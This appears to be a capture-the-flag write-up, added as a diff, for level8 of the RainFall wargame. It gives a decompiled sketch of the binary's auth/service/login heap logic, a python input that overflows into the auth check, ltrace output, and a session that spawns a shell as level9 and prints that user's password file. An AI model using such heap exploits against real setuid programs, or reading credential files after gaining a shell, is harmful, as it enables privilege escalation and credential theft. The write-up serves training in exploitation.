@@ -1,0 +1,45 @@
+"auth " == malloc(4) 0x0804a008[0] == 0
+	strcpy(auth, local_8b) if len(0x0804a008)
+"reset" == free(0x0804a008) if 0x0804a008 once
+"service" == strdup(acStack137) 0x08049ab0 if local_90 > "service"
+"login" == if 0x804a008 > "login":
+	fwrite("Password:\n", 1, 10, stdout) if auth[8] == 0
+	else system("/bin/sh")
+
+
+level8@RainFall:~$ python -c 'print("auth " + "a" + "\x00" * 121 + "service " + "a" * 30 + "\x00" * 89 + "login")' | ltrace ./level8
+__libc_start_main(0x8048564, 1, 0xbffff7a4, 0x8048740, 0x80487b0 <unfinished ...>
+printf("%p, %p \n", (nil), (nil)(nil), (nil)
+)                     = 14
+fgets("auth a", 128, 0xb7fd1ac0)                      = 0xbffff680
+malloc(4)                                             = 0x0804a008
+strcpy(0x0804a008, "a")                               = 0x0804a008
+printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
+)                 = 18
+fgets("service aaaaaaaaaaaaaaaaaaaaaaaa"..., 128, 0xb7fd1ac0) = 0xbffff680
+strdup(" aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")             = 0x0804a018
+printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
+)             = 22
+fgets("login\n", 128, 0xb7fd1ac0)                     = 0xbffff680
+system("/bin/sh" <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                = 0
+printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
+)             = 22
+fgets(NULL, 128, 0xb7fd1ac0)                          = NULL
++++ exited (status 0) +++
+level8@RainFall:~$
+
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth 01234567
+0x804a008, (nil)
+service 303030303030303030303030303030
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
